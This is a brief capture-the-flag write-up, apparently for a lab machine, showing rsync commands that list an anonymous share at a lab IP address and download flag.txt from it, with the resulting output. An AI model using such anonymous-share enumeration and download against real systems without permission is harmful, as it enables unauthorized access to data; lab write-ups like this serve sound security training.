> [!Note] What this box taught?
> 1. Enumeration
> 2. Exploit null session on rsync

## Exploitation
Listing shares
```
rsync --list-only rsync://10.129.228.37
public         	Anonymous Share

```

Downloading file
```
rsync -av rsync://10.129.228.37/public/flag.txt ./flag.txt
receiving incremental file list
flag.txt
```
